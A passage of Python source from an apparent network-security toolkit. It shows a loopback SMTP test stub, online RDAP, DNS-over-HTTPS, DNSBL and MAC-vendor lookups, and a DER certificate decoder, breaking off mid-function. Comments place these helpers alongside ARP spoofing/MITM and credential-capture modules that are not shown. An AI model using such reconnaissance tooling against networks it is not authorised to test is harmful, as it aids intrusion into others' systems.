    DATA, QUIT) and records every complete message in self.messages.
    """

    def __init__(self, host: str = "127.0.0.1") -> None:
        import socketserver

        self.messages: List[bytes] = []
        self.transcript: List[str] = []
        outer = self

        class _Handler(socketserver.StreamRequestHandler):
            def _reply(self, text: str) -> None:
                try:
                    self.wfile.write((text + "\r\n").encode("utf-8"))
                    self.wfile.flush()
                except OSError:
                    return

            def handle(self) -> None:
                outer.transcript.append("connect")
                self._reply("220 prismstrike-stub ESMTP ready")
                in_data = False
                buffer: List[bytes] = []
                while True:
                    try:
                        raw = self.rfile.readline(8192)
                    except OSError:
                        break
                    if not raw:
                        break
                    line = raw.decode("utf-8", "replace").rstrip("\r\n")
                    if in_data:
                        if line == ".":
                            outer.messages.append(b"\r\n".join(buffer))
                            outer.transcript.append("data-complete")
                            buffer = []
                            in_data = False
                            self._reply("250 2.0.0 Ok: queued")
                        else:
                            buffer.append(line.encode("utf-8", "replace"))
                        continue
                    upper = line.upper()
                    outer.transcript.append(upper.split(" ", 1)[0] if upper else "")
                    if upper.startswith("EHLO"):
                        self._reply("250-prismstrike-stub")
                        self._reply("250 SIZE 10485760")
                    elif upper.startswith("HELO"):
                        self._reply("250 prismstrike-stub")
                    elif upper.startswith("MAIL FROM"):
                        self._reply("250 2.1.0 Ok")
                    elif upper.startswith("RCPT TO"):
                        self._reply("250 2.1.5 Ok")
                    elif upper.startswith("DATA"):
                        in_data = True
                        buffer = []
                        self._reply("354 End data with <CR><LF>.<CR><LF>")
                    elif upper.startswith("QUIT"):
                        self._reply("221 2.0.0 Bye")
                        break
                    elif upper.startswith(("RSET", "NOOP")):
                        self._reply("250 2.0.0 Ok")
                    elif upper.startswith("AUTH"):
                        self._reply("504 5.7.4 Unrecognised authentication type")
                    else:
                        self._reply("250 2.0.0 Ok")

        self._server = socketserver.ThreadingTCPServer((host, 0), _Handler)
        self._server.daemon_threads = True

    @property
    def host(self) -> str:
        return str(self._server.server_address[0])

    @property
    def port(self) -> int:
        return int(self._server.server_address[1])

    def start(self) -> "LoopbackSMTPServer":
        threading.Thread(target=self._server.serve_forever, daemon=True).start()
        return self

    def stop(self) -> None:
        try:
            self._server.shutdown()
            self._server.server_close()
        except OSError:
            pass

    def __enter__(self) -> "LoopbackSMTPServer":
        return self.start()

    def __exit__(self, exc_type, exc, tb) -> None:
        self.stop()


# ===========================================================================
# ONLINE INTELLIGENCE & ALERTING SPINE (v3.2.0)
#
# Everything in this section reaches out over the wire and is shared by every
# module, so that "online mode" is not limited to the reporting surfaces:
#
#   01 ICMP recon ....... enrich sweep results: DoH resolution, PTR, RDAP, geo
#   02 TCP crafter ...... enrich findings: TLS certificate, HTTP headers, RDAP
#   03 Hping ............ live reply telemetry streamed to the alert relay
#   04 Nmap ............. bulk RDAP enrichment of scan results
#   05 Sniffer .......... NDJSON event sink: every journal event to a collector
#   06 ARP discovery .... online OUI/vendor lookup, new-device alerts
#   07 ARP spoof/MITM ... poisoning lifecycle alerts, gateway RDAP dossier
#   13 Utilities ........ online RDAP ownership, TLS inspection, HTTP inspection
#   14 DHCP ............. DHCP server alerts, lease-ledger push to a collector
#   15 DNS toolkit ...... DNS over HTTPS resolver, DNSBL reputation checks
#   16 Wireless lab ..... online vendor lookup, scan-result push
#   17 Listeners ........ client geolocation, credential-capture alerts
#   18 Reporting ........ webhook/SMTP delivery plus the NDJSON event sink
#
# Every path degrades cleanly: an unreachable endpoint produces a warning and a
# status line, never a traceback, and never a loss of the local journal.
# ===========================================================================
RDAP_DEFAULT_BOOTSTRAP = "https://rdap.org"
GEOIP_DEFAULT_ENDPOINT = "http://ip-api.com/json"
MACVENDORS_DEFAULT_ENDPOINT = "https://api.macvendors.com"
DOH_RESOLVERS: "OrderedDict[str, str]" = OrderedDict([
    ("cloudflare", "https://cloudflare-dns.com/dns-query"),
    ("google", "https://dns.google/resolve"),
    ("quad9", "https://dns.quad9.net:5053/dns-query"),
    ("adguard", "https://dns.adguard-dns.com/resolve"),
])
DOH_TYPE_CODES: "OrderedDict[str, int]" = OrderedDict([
    ("A", 1), ("NS", 2), ("CNAME", 5), ("SOA", 6), ("PTR", 12), ("MX", 15),
    ("TXT", 16), ("AAAA", 28), ("SRV", 33), ("HTTPS", 65), ("CAA", 257), ("ANY", 255),
])
DEFAULT_DNSBL_ZONES: Tuple[str, ...] = (
    "zen.spamhaus.org", "bl.spamcop.net", "b.barracudacentral.org",
    "dnsbl.sorbs.net", "spam.dnsbl.sorbs.net",
)
DNSBL_CODES = {
    "127.0.0.2": "listed by Spamhaus SBL/CSS (spam source)",
    "127.0.0.3": "listed by Spamhaus SBL (spam source)",
    "127.0.0.4": "listed by Spamhaus XBL/exploits blocklist",
    "127.0.0.9": "listed by Spamhaus DROP (hijacked/leased netblock)",
    "127.0.0.10": "listed by Spamhaus PBL (policy blocklist)",
    "127.0.0.11": "listed by Spamhaus PBL (dynamic/residential)",
}
SECURITY_HEADERS = (
    "strict-transport-security", "content-security-policy", "x-frame-options",
    "x-content-type-options", "referrer-policy", "permissions-policy",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
)
ALERT_KINDS = (
    "host-up", "port-open", "arp-conflict", "dhcp-server", "wifi-ap",
    "credential-capture", "mitm-lifecycle", "tunnel-suspect", "session-event",
    "probe", "test",
)


def _intel_scan(module: str, summary: Dict[str, Any], target: str = "") -> str:
    """Persist an online-intelligence artefact and announce it."""
    try:
        artifact = LOGGER.scan(module, summary, target=target)
    except Exception as exc:
        warn("artefact write skipped for %s: %s: %s" % (module, type(exc).__name__, exc))
        return ""
    if artifact:
        note("artefact: %s" % artifact)
    return artifact


# ---------------------------------------------------------------------------
# RDAP - registration data access protocol (ownership of IPs and domains)
# ---------------------------------------------------------------------------
def _rdap_entity_names(entity: Dict[str, Any]) -> List[str]:
    """Pull human names/emails out of an RDAP vCard entity."""
    names: List[str] = []
    for card in entity.get("vcardArray", [None, []])[1] if isinstance(entity.get("vcardArray"), list) else []:
        try:
            if card and card[0] == "fn" and len(card) > 3:
                names.append(str(card[3]))
            elif card and card[0] == "email" and len(card) > 3:
                names.append(str(card[3]))
        except (IndexError, TypeError):
            continue
    return names


def rdap_lookup(target: str, bootstrap: str = RDAP_DEFAULT_BOOTSTRAP,
                timeout: float = 12.0) -> Dict[str, Any]:
    """
    Online ownership lookup for an IPv4/IPv6 address or a domain name.

    Queries an RDAP bootstrap service and flattens the response into a report:
    handle, network range, country, allocating registry, organisations, abuse
    contact, registration/last-changed events and notices.
    """
    text = str(target).strip()
    if not text:
        raise FrameworkError("no RDAP target supplied")
    try:
        ipaddress.ip_address(text)
        kind = "ip"
    except ValueError:
        if not re.match(r"^[A-Za-z0-9._-]+\.[A-Za-z]{2,}$", text):
            raise FrameworkError("'%s' is neither an IPv4/IPv6 address nor a domain" % text)
        kind = "domain"
    url = "%s/%s/%s" % (str(bootstrap).rstrip("/"), kind, urllib.parse.quote(text))
    out("  %s RDAP %s lookup: %s" % (c("ONLINE", "bcyan", "bold"), kind.upper(), text))
    payload = _http_json(url, timeout=max(2.0, float(timeout)))
    summary: Dict[str, Any] = OrderedDict()
    summary["mode"] = "rdap-lookup"
    summary["query"] = text
    summary["query_type"] = kind.upper()
    summary["source"] = url
    summary["handle"] = str(payload.get("handle", "") or "")
    summary["name"] = str(payload.get("name", "") or "")
    summary["kind"] = str(payload.get("type", "") or (payload.get("objectClassName") or ""))
    summary["country"] = str(payload.get("country", "") or "")
    summary["start_address"] = str(payload.get("startAddress", "") or "")
    summary["end_address"] = str(payload.get("endAddress", "") or "")
    summary["parent_handle"] = str(payload.get("parentHandle", "") or "")
    summary["status"] = [str(item) for item in payload.get("status", []) if item]
    organisations: List[Dict[str, Any]] = []
    abuse_contacts: List[str] = []
    for entity in payload.get("entities", []) if isinstance(payload.get("entities"), list) else []:
        try:
            roles = [str(role) for role in entity.get("roles", [])]
        except (TypeError, AttributeError):
            roles = []
        names = _rdap_entity_names(entity)
        organisation = OrderedDict([("roles", roles), ("names", names),
                                    ("handle", str(entity.get("handle", "")) or "")])
        organisations.append(organisation)
        if any("abuse" in role.lower() for role in roles):
            for name in names:
                if "@" in name:
                    abuse_contacts.append(name)
    summary["entities"] = organisations
    summary["abuse_contacts"] = sorted(set(abuse_contacts))
    events: "OrderedDict[str, str]" = OrderedDict()
    for event in payload.get("events", []) if isinstance(payload.get("events"), list) else []:
        action = str(event.get("eventAction", "") or "").lower()
        if action:
            events[action] = str(event.get("eventDate", "") or "")
    summary["events"] = events
    notices: List[str] = []
    for block in ("notices", "remarks"):
        for entry in payload.get(block, []) if isinstance(payload.get(block), list) else []:
            title = str(entry.get("title", "") or "")
            for description in entry.get("description", []) if isinstance(entry.get("description"), list) else []:
                notices.append(("%s: %s" % (title, description)) if title else str(description))
    summary["notices"] = notices[:12]
    heading("RDAP OWNERSHIP RECORD")
    kv_table([
        ("Query", "%s (%s)" % (text, kind.upper())),
        ("Handle / name", "%s / %s" % (summary["handle"] or "?", summary["name"] or "?")),
        ("Object class / status", "%s / %s" % (summary["kind"] or "?", ", ".join(summary["status"]) or "?")),
        ("Network range", "%s - %s" % (summary["start_address"] or "?", summary["end_address"] or "?")),
        ("Country", summary["country"] or "?"),
        ("Parent handle", summary["parent_handle"] or "-"),
        ("Registered", events.get("registration", "-") or "-"),
        ("Last changed", events.get("last changed", "-") or "-"),
        ("Abuse contact", ", ".join(summary["abuse_contacts"]) or "not published"),
    ])
    if organisations:
        out(c("  entities", "cyan"))
        for entity in organisations[:8]:
            out("    %-24s %s%s" % (",".join(entity["roles"]) or "entity",
                                    entity["handle"] or "",
                                    (" - " + "; ".join(entity["names"][:2])) if entity["names"] else ""))
    if notices:
        out("")
        out(c("  notices", "cyan"))
        for notice in notices[:5]:
            out("    %s" % notice[:110])
    _intel_scan("rdap", summary, target=text)
    return summary


# ---------------------------------------------------------------------------
# DNS over HTTPS, DNSBL reputation and online vendor lookup
# ---------------------------------------------------------------------------
def doh_query(name: str, qtype: str = "A", resolver: str = "",
              timeout: float = 8.0) -> Dict[str, Any]:
    """
    Resolve a name through DNS over HTTPS (RFC 8484 JSON API).

    The same records the native resolver fetches over UDP/53, but tunneled in
    HTTPS/tcp-443 - useful when plain DNS is filtered on the local segment.
    """
    domain = str(name).strip().rstrip(".")
    if not domain:
        raise FrameworkError("no name supplied for the DoH query")
    record_type = str(qtype).strip().upper() or "A"
    if record_type not in DOH_TYPE_CODES:
        raise FrameworkError("unsupported DoH record type '%s' (use %s)"
                             % (record_type, "/".join(DOH_TYPE_CODES.keys())))
    requested = str(resolver).strip()
    candidates = [requested] if requested else list(DOH_RESOLVERS.values())
    payload: Optional[Dict[str, Any]] = None
    endpoint = candidates[0]
    last_error: Optional[Exception] = None
    for candidate in candidates:
        separator = "&" if "?" in candidate else "?"
        url = "%s%sname=%s&type=%s" % (candidate, separator, urllib.parse.quote(domain),
                                       record_type)
        try:
            payload = _http_json(url, timeout=max(2.0, float(timeout)),
                                 headers={"Accept": "application/dns-json"})
            endpoint = candidate
            break
        except FrameworkError as exc:
            last_error = exc
            if len(candidates) > 1:
                warn("DoH endpoint %s failed (%s) - trying the next resolver"
                     % (candidate, exc))
    if payload is None:
        raise FrameworkError("every DoH resolver failed: %s" % (last_error,))
    out("  %s DoH %s %s via %s" % (c("ONLINE", "bcyan", "bold"), record_type, domain, endpoint))
    status_code = int(payload.get("Status", 0) or 0)
    answers: List[Dict[str, Any]] = []
    for section in ("Answer", "Authority", "Additional"):
        for entry in payload.get(section, []) if isinstance(payload.get(section), list) else []:
            try:
                type_name = DNS_QTYPE_NAMES.get(int(entry.get("type", 0)), str(entry.get("type")))
            except (TypeError, ValueError):
                type_name = str(entry.get("type"))
            answers.append(OrderedDict([
                ("section", section),
                ("name", str(entry.get("name", "") or "").rstrip(".")),
                ("type", type_name),
                ("ttl", entry.get("TTL")),
                ("data", str(entry.get("data", "") or "")),
            ]))
    summary = OrderedDict([
        ("mode", "doh-query"),
        ("name", domain),
        ("type", record_type),
        ("resolver", endpoint),
        ("rcode", status_code),
        ("rcode_name", DNS_RCODE_NAMES.get(status_code, "UNKNOWN") if "DNS_RCODE_NAMES" in globals() else str(status_code)),
        ("answered", bool(answers)),
        ("answers", answers),
        ("authenticated_data", bool(payload.get("AD"))),
    ])
    heading("DNS OVER HTTPS RESULT")
    kv_table([
        ("Query", "%s %s" % (record_type, domain)),
        ("Resolver", endpoint),
        ("Status", "NOERROR" if status_code == 0 else "rcode %d" % status_code),
        ("Answers", len(answers)),
        ("DNSSEC AD flag", "set" if summary["authenticated_data"] else "not set"),
    ])
    if answers:
        out(c("  %-6s %-6s %-40s %s" % ("TYPE", "TTL", "NAME", "DATA"), "bold"))
        for row in answers[:25]:
            out("  %-6s %-6s %-40s %s" % (row["type"], str(row["ttl"])[:6],
                                          row["name"][:40], row["data"][:60]))
    else:
        warn("the DoH resolver returned no records for that type.")
    _intel_scan("doh_query", summary, target=domain)
    return summary


def dnsbl_check(ip: str, zones: Sequence[str] = DEFAULT_DNSBL_ZONES,
                timeout: float = 6.0, server: str = "",
                source_port: Optional[int] = None) -> Dict[str, Any]:
    """
    Check an address against DNS blocklists (DNSBL/RBL) over live DNS.

    Each zone is queried for <reversed-ip>.<zone>; an A answer inside 127.0.0.0/8
    means the address is listed, and the specific return code identifies the
    listing reason where the zone publishes one.
    """
    address = str(ip).strip()
    try:
        parsed = ipaddress.ip_address(address)
    except ValueError:
        raise FrameworkError("'%s' is not a valid IPv4/IPv6 address" % address)
    if parsed.version != 4:
        raise FrameworkError("DNSBL checks are defined for IPv4 addresses only")
    reversed_ip = ".".join(reversed(address.split(".")))
    rows: List[Dict[str, Any]] = []
    for zone in zones:
        query = "%s.%s" % (reversed_ip, zone)
        row: Dict[str, Any] = OrderedDict([("zone", zone), ("query", query),
                                           ("listed", False), ("code", ""), ("detail", "")])
        try:
            result = dns_query_native(query, qtype="A", timeout=timeout,
                                      server=server or None, source_port=source_port)
            answers = result.get("answers", []) if isinstance(result, dict) else []
            codes = [str(item.get("value", item.get("data", "")))
                     for item in answers if isinstance(item, dict)]
            bad = [code for code in codes if code.startswith("127.")]
            if bad:
                row["listed"] = True
                row["code"] = bad[0]
                row["detail"] = DNSBL_CODES.get(bad[0], "listed (operator-specific return code)")
            elif codes:
                row["detail"] = "answered %s (not a 127.0.0.0/8 listing code)" % ",".join(codes[:3])
            else:
                row["detail"] = "not listed"
        except (FrameworkError, OSError) as exc:
            row["detail"] = "zone unavailable: %s" % str(exc)[:70]
        rows.append(row)
        out("  %-26s %s %s" % (zone, c("LISTED", "bred", "bold") if row["listed"] else c("clean", "bgreen"),
                               c(row["detail"][:60], "grey")))
    listed = [row for row in rows if row["listed"]]
    summary = OrderedDict([
        ("mode", "dnsbl-check"),
        ("address", address),
        ("zones_checked", len(rows)),
        ("listed_in", [row["zone"] for row in listed]),
        ("results", rows),
    ])
    heading("DNSBL REPUTATION")
    kv_table([
        ("Address", address),
        ("Zones checked", len(rows)),
        ("Listings", ", ".join(summary["listed_in"]) or "none"),
        ("Verdict", "listed - investigate sending reputation" if listed else "no public listing found"),
    ])
    if listed:
        warn("public blocklists are reputation hints, not proof: verify with the zone's own lookup page.")
    _intel_scan("dnsbl", summary, target=address)
    return summary


def mac_vendor_online(mac: str, api_base: str = MACVENDORS_DEFAULT_ENDPOINT,
                      timeout: float = 8.0) -> Dict[str, Any]:
    """Resolve an OUI to a vendor online, falling back to the local table."""
    normalised = parse_mac(mac)
    summary: Dict[str, Any] = OrderedDict([
        ("mode", "mac-vendor-online"), ("mac", normalised), ("oui", ""),
        ("vendor", ""), ("source", "local-table"), ("status", ""),
    ])
    try:
        summary["oui"] = normalised.replace(":", "")[:6].upper()
    except (AttributeError, TypeError):
        summary["oui"] = ""
    local_vendor = oui_vendor(normalised)
    locally_managed = "locally administered" in (local_vendor or "").lower()
    if local_vendor and local_vendor != "unknown" and not locally_managed:
        summary["vendor"] = local_vendor
        summary["status"] = "resolved locally (no network call needed)"
    else:
        url = "%s/%s" % (str(api_base).rstrip("/"), normalised.replace(":", "-"))
        try:
            response = _http_request(url, timeout=max(2.0, float(timeout)))
            with response:
                body = response.read(2048).decode("utf-8", "replace").strip()
            summary["vendor"] = body or "not found"
            summary["source"] = "online-api"
            summary["status"] = "resolved online via %s" % api_base
        except FrameworkError as exc:
            summary["vendor"] = local_vendor or "unknown"
            summary["status"] = "online lookup failed (%s) - local table returned '%s'" % (
                str(exc)[:60], summary["vendor"])
    heading("OUI / VENDOR RESOLUTION")
    kv_table([
        ("MAC", normalised),
        ("OUI prefix", summary["oui"]),
        ("Vendor", summary["vendor"] or "unknown"),
        ("Source", summary["source"]),
        ("Status", summary["status"]),
    ])
    _intel_scan("mac_vendor", summary, target=normalised)
    return summary


# ---------------------------------------------------------------------------
# Live TLS and HTTP inspection (remote service fingerprinting)
# ---------------------------------------------------------------------------
def _parse_cert_time(value: str) -> Optional[float]:
    """Tolerant parser for the two certificate time formats OpenSSL emits."""
    text = str(value or "").strip().replace("GMT", "UTC")
    for fmt in ("%b %d %H:%M:%S %Y %Z", "%b %d %H:%M:%S %Y", "%Y%m%d%H%M%SZ",
                "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S"):
        try:
            parsed = _dt.datetime.strptime(text, fmt)
            if parsed.tzinfo is None:
                parsed = parsed.replace(tzinfo=_dt.timezone.utc)
            return parsed.timestamp()
        except (ValueError, TypeError):
            continue
    return None


def _render_rdn(mapping: Optional[Dict[str, str]]) -> str:
    """Render a decoded RDN attribute map as 'CN=..., O=...'."""
    return ", ".join("%s=%s" % (key, value) for key, value in (mapping or {}).items())


def _cert_name(entry: Any) -> str:
    """Flatten an ssl certificate subject/issuer tuple-of-tuples to 'CN=x, O=y'."""
    parts: List[str] = []
    for group in entry or []:
        try:
            for key, value in group:
                if key in ("commonName", "organizationName", "countryName",
                           "stateOrProvinceName", "localityName", "organizationalUnitName"):
                    parts.append("%s=%s" % (key, value))
        except (TypeError, ValueError):
            continue
    return ", ".join(parts) or "?"


# ---------------------------------------------------------------------------
# Native DER / X.509 decoding
#
# CPython deliberately returns an EMPTY certificate dictionary when a handshake
# runs in inspection mode (CERT_NONE), and a self-signed lab certificate makes a
# verifying handshake fail outright. Rather than depend on a third-party crypto
# package, the DER bytes are decoded here: certificate skeleton, subject and
# issuer RDNs, validity window, serial, signature algorithm, SANs and public-key
# size. This keeps the online inspection complete on any Python 3.9+ host.
# ---------------------------------------------------------------------------
_DER_RDN_OIDS = {
    "2.5.4.3": "commonName", "2.5.4.6": "countryName", "2.5.4.7": "localityName",
    "2.5.4.8": "stateOrProvinceName", "2.5.4.10": "organizationName",
    "2.5.4.11": "organizationalUnitName", "1.2.840.113549.1.9.1": "emailAddress",
    "0.9.2342.19200300.100.1.25": "domainComponent",
}
_DER_SIGNATURE_OIDS = {
    "1.2.840.113549.1.1.5": "sha1WithRSAEncryption",
    "1.2.840.113549.1.1.11": "sha256WithRSAEncryption",
    "1.2.840.113549.1.1.12": "sha384WithRSAEncryption",
    "1.2.840.113549.1.1.13": "sha512WithRSAEncryption",
    "1.2.840.113549.1.1.10": "rsassaPss",
    "1.2.840.10045.4.3.2": "ecdsa-with-SHA256",
    "1.2.840.10045.4.3.3": "ecdsa-with-SHA384",
    "1.2.840.10045.4.3.4": "ecdsa-with-SHA512",
    "1.3.101.112": "Ed25519",
    "1.3.101.113": "Ed448",
}
_DER_KEY_OIDS = {
    "1.2.840.113549.1.1.1": "RSA",
    "1.2.840.10045.2.1": "EC",
    "1.3.101.112": "Ed25519",
    "1.3.101.113": "Ed448",
}
_DER_CURVE_OIDS = {
    "1.2.840.10045.3.1.7": "prime256v1 (P-256)",
    "1.3.132.0.34": "secp384r1 (P-384)",
    "1.3.132.0.35": "secp521r1 (P-521)",
    "1.3.132.0.10": "secp256k1",
    "1.2.840.10045.3.1.1": "prime192v1 (P-192)",
}

_DER_CURVE_BITS = {
    "prime256v1 (P-256)": 256, "secp384r1 (P-384)": 384,
    "secp521r1 (P-521)": 521, "secp256k1": 256, "prime192v1 (P-192)": 192,
}


def _der_tlv(data: bytes, offset: int) -> Tuple[int, int, int, int]:
    """Read one DER TLV; returns (tag, header_start, content_start, content_end)."""
    if offset + 2 > len(data):
        raise FrameworkError("truncated DER element at offset %d" % offset)
    header_start = offset
    tag = data[offset]
    offset += 1
    length_byte = data[offset]
    offset += 1
    if length_byte & 0x80:
        size_bytes = length_byte & 0x7F
        if size_bytes == 0 or offset + size_bytes > len(data):
            raise FrameworkError("invalid DER length at offset %d" % header_start)
        length = int.from_bytes(data[offset:offset + size_bytes], "big")
        offset += size_bytes
    else:
        length = length_byte
    content_end = offset + length
    if content_end > len(data):
        raise FrameworkError("DER element overruns the buffer at offset %d" % header_start)
    return tag, header_start, offset, content_end


def _der_oid_to_string(raw: bytes) -> str:
    """Decode an OBJECT IDENTIFIER payload into dotted-decimal notation."""
    if not raw:
        return ""
    first = raw[0]
    parts = [str(first // 40), str(first % 40)]
    value = 0
    for byte in raw[1:]:
        value = (value << 7) | (byte & 0x7F)
        if not byte & 0x80:
            parts.append(str(value))
            value = 0
    return ".".join(parts)


def _der_collect_attributes(block: bytes, start: int, end: int,
                            attributes: "OrderedDict[str, str]", depth: int) -> None:
    """
    Walk an RDNSequence range and merge every AttributeTypeAndValue pair found.

    The walk accepts either layer of the structure: a SET OF AttributeTypeAndValue
    (tag 0x31) is descended into, a SEQUENCE whose first child is an OID is read
    as one attribute, and any other SEQUENCE is treated as a wrapper and
    descended into as well.  That tolerance means the same helper copes with a
    bare RDNSequence, with its enclosing Name SEQUENCE, and with multi-valued
    relative distinguished names.
    """
    if depth > 4:
        return
    cursor = start
    while cursor < end:
        tag, _, item_start, item_end = _der_tlv(block, cursor)
        cursor = item_end
        if tag == 0x31:                                    # SET OF ATV
            _der_collect_attributes(block, item_start, item_end, attributes, depth + 1)
        elif tag == 0x30:                                  # ATV or wrapper SEQUENCE
            if item_start < item_end and block[item_start] == 0x06:
                _, _, oid_start, oid_end = _der_tlv(block, item_start)
                oid = _der_oid_to_string(block[oid_start:oid_end])
                value = ""
                if oid_end < item_end:
                    value_tag, _, value_start, value_end = _der_tlv(block, oid_end)
                    raw = block[value_start:value_end]
                    try:
                        if value_tag in (0x1E, 0x1C):          # BMPString / UniversalString
                            step = 2 if value_tag == 0x1E else 4
                            value = raw.decode("utf-16-be" if step == 2 else "utf-32-be",
                                               "replace")
                        elif value_tag in (0x0C, 0x16, 0x1A, 0x1B):   # UTF8/IA5/Visible/General
                            value = raw.decode("utf-8", "replace")
                        elif value_tag in (0x13, 0x14, 0x12):  # Printable/T61/Numeric
                            value = raw.decode("ascii", "replace")
                        else:
                            value = raw.decode("utf-8", "replace")
                    except (UnicodeDecodeError, ValueError):
                        value = raw.hex()
                if oid:
                    attributes[_DER_RDN_OIDS.get(oid, oid)] = value
            else:                                          # wrapper: descend
                _der_collect_attributes(block, item_start, item_end, attributes, depth + 1)


def _der_parse_name(block: bytes) -> Dict[str, str]:
    """
    Decode an X.509 Name into a flat attribute dictionary.

    Accepts either the full Name SEQUENCE or just its content, which is what
    der_decode_certificate hands over; unparsable input yields whatever was
    recovered instead of raising.
    """
    attributes: "OrderedDict[str, str]" = OrderedDict()
    try:
        start, end = 0, len(block)
        if block[:1] == b"\x30" and len(block) > 2:
            _, _, start, end = _der_tlv(block, 0)          # skip a Name wrapper
        _der_collect_attributes(block, start, end, attributes, 0)
    except (FrameworkError, IndexError, ValueError):
        return attributes
    return attributes

def _der_parse_time(block: bytes, offset: int) -> Tuple[str, int]:
    """Decode a UTCTime (0x17) or GeneralizedTime (0x18) into an ISO string."""
    tag, _, start, end = _der_tlv(block, offset)
    raw = block[start:end].decode("ascii", "replace")
    text = raw.rstrip("Z").replace("Z", "")
    try:
        if tag == 0x17 and len(text) >= 12:            # YYMMDDhhmmss
            year = int(text[0:2])
            year += 2000 if year < 50 else 1900
            parsed = "%04d-%s-%s %s:%s:%s" % (year, text[2:4], text[4:6],
                                              text[6:8], text[8:10], text[10:12])
        elif tag == 0x18 and len(text) >= 14:          # YYYYMMDDhhmmss
            parsed = "%s-%s-%s %s:%s:%s" % (text[0:4], text[4:6], text[6:8],
                                            text[8:10], text[10:12], text[12:14])
        else:
            parsed = raw
    except (ValueError, IndexError):
        parsed = raw
    return parsed, end


def _der_decode_general_name(block: bytes, tag: int, start: int, end: int) -> str:
    """Render one GeneralName entry from its context tag and content range."""
    raw = block[start:end]
    if tag in (0x81, 0x82, 0x86):                 # rfc822Name / dNSName / URI
        return raw.decode("ascii", "replace")
    if tag == 0x87:                               # iPAddress (4 or 16 bytes)
        if len(raw) == 4:
            return ".".join(str(byte) for byte in raw)
        if len(raw) == 16:
            return ":".join("%02x" % byte for byte in raw)
        return raw.hex()
    if tag == 0xA4:                               # directoryName: a full Name
        attributes = _der_parse_name(raw)
        return ", ".join("%s=%s" % (key, value) for key, value in attributes.items())
    if tag == 0xA0:                               # otherName: OID + [0] EXPLICIT value
        try:
            _, _, oid_start, oid_end = _der_tlv(raw, 0)
            oid = _der_oid_to_string(raw[oid_start:oid_end])
            if oid_end < len(raw):
                _, _, value_start, value_end = _der_tlv(raw, oid_end)
                extra = raw[value_start:value_end].decode("utf-8", "replace")
                return "%s=%s" % (oid, extra) if extra else oid
            return oid
        except (FrameworkError, IndexError, ValueError):
            return raw.hex()
    if tag & 0xC0 == 0x80:                        # any other context-specific name
        return raw.decode("utf-8", "replace")
    return raw.hex()


def _der_walk_general_names(block: bytes, start: int, end: int,
                            entries: List[str], depth: int) -> None:
    """
    Walk a GeneralNames range and append every decoded entry.

    Nested SEQUENCE/SET wrappers are descended into rather than decoded as one
    entry: encoders that wrap the template container inside the extension value
    would otherwise shift every following offset and silently drop names (or
    dump their raw bytes as hex).
    """
    if depth > 4:
        return
    cursor = start
    while cursor < end:
        tag, _, item_start, item_end = _der_tlv(block, cursor)
        cursor = item_end
        if tag in (0x30, 0x31):                   # wrapper SEQUENCE / SET
            _der_walk_general_names(block, item_start, item_end, entries, depth + 1)
            continue
        entries.append(_der_decode_general_name(block, tag, item_start, item_end))


def _der_parse_san(extension_payload: bytes) -> List[str]:
    """
    Decode a subjectAltName (2.5.29.17) extension into readable entries.

    Accepts either the full GeneralNames SEQUENCE or just its content, and
    tolerates nested wrapper SEQUENCEs at any depth.
    """
    entries: List[str] = []
    try:
        start, end = 0, len(extension_payload)
        first_tag, _, first_start, first_end = _der_tlv(extension_payload, 0)
        if first_tag in (0x30, 0x31) and first_start < first_end:
            inner = extension_payload[first_start]
            if inner in (0x30, 0x31) or (inner & 0xC0) == 0x80:
                start, end = first_start, first_end
        _der_walk_general_names(extension_payload, start, end, entries, 0)
    except (FrameworkError, IndexError, ValueError):
        return entries
    return entries


def _der_public_key_info(spki: bytes) -> Dict[str, Any]:
    """
    Extract key type and size from a SubjectPublicKeyInfo structure.

    spki is normally the content of the structure (AlgorithmIdentifier followed
    by the subjectPublicKey bit string), but a full SubjectPublicKeyInfo TLV is
    accepted too.  RSA sizes come from the modulus, EC sizes from the named
    curve, EdDSA sizes from the algorithm itself.
    """
    info: Dict[str, Any] = OrderedDict([("type", "unknown"), ("bits", None), ("curve", "")])
    try:
        cursor = 0
        tag, _, first_start, first_end = _der_tlv(spki, 0)
        if tag == 0x30 and first_start < first_end:
            # Distinguish the two accepted inputs by looking one level deeper: when
            # the first child is itself a SEQUENCE the buffer is a full
            # SubjectPublicKeyInfo and the walk starts inside it, whereas an OID
            # child means the buffer is already the AlgorithmIdentifier.
            inner_tag, _, _, _ = _der_tlv(spki, first_start)
            if inner_tag == 0x30:
                cursor = first_start
        # AlgorithmIdentifier SEQUENCE { algorithm OBJECT IDENTIFIER, parameters ANY }
        _, _, alg_start, alg_end = _der_tlv(spki, cursor)
        _, _, oid_start, oid_end = _der_tlv(spki, alg_start)
        algorithm_oid = _der_oid_to_string(spki[oid_start:oid_end])
        info["type"] = _DER_KEY_OIDS.get(algorithm_oid, algorithm_oid or "unknown")
        alg_cursor = oid_end
        if info["type"] == "EC" and alg_cursor < alg_end:
            curve_tag, _, curve_start, curve_end = _der_tlv(spki, alg_cursor)
            if curve_tag == 0x06:                          # namedCurve OBJECT IDENTIFIER
                curve_oid = _der_oid_to_string(spki[curve_start:curve_end])
                info["curve"] = _DER_CURVE_OIDS.get(curve_oid, curve_oid)
                info["bits"] = _DER_CURVE_BITS.get(info["curve"])
        # subjectPublicKey BIT STRING, immediately after the AlgorithmIdentifier
        _, _, key_start, key_end = _der_tlv(spki, alg_end)
        key_bytes = spki[key_start:key_end]
        if key_bytes[:1] == b"\x00":                        # strip the unused-bits octet
            key_bytes = key_bytes[1:]
        if info["type"] == "RSA" and key_bytes:
            _, _, seq_start, _ = _der_tlv(key_bytes, 0)        # RSAPublicKey SEQUENCE
            _, _, modulus_start, modulus_end = _der_tlv(key_bytes, seq_start)
            modulus = key_bytes[modulus_start:modulus_end].lstrip(b"\x00")
            info["bits"] = len(modulus) * 8 if modulus else None
        elif info["type"] in ("Ed25519", "Ed448") and key_bytes:
            info["bits"] = 256 if info["type"] == "Ed25519" else 448
    except (FrameworkError, IndexError, ValueError):
        return info
    return info

def der_decode_certificate(der: bytes) -> Dict[str, Any]:
    """
    Decode an X.509 certificate from DER bytes without third-party libraries.

    Returns subject/issuer attribute maps, validity window, serial, signature
    algorithm, SAN entries and public-key metadata; unparsable certificates yield
    whatever was recovered rather than raising.
    """
    result: Dict[str, Any] = OrderedDict([
        ("subject", {}), ("issuer", {}), ("serial", ""), ("not_before", ""),
        ("not_after", ""), ("san", []), ("signature_algorithm", ""),
        ("public_key", {}), ("version", ""), ("decoded", False),
    ])
    try:
